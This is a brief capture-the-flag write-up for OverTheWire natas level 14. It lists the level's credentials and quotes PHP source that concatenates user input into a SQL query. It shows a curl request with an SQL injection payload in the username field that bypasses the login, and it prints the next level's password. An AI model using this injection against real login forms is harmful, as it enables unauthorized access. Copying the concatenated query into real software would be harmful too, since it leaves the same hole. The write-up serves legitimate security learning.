# natas level14
natas is CTF with web application.
password will be stored in `/etc/natas_webpass/natas14`.

## using credential is below.
- User:natas14
- Pass:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

## using tools.
- shell(curl, base64, etc)
- lynx
- exiftool
check web site by lynx.
`lynx http://natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1@natas14.natas.labs.overthewire.org`

And I check source of this website, this has simple sql injection vulnerability.
~~~
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
if(array_key_exists("debug", $_GET)) {
   echo "Executing query: $query<br>";
}
~~~
I send following request, and got password!
`curl -X POST 'http://natas14.natas.labs.overthewire.org/index.php?debug' -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 -d 'username=oshiba" or "1" = "1"; -- &password=test&submit=Login'`

password:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

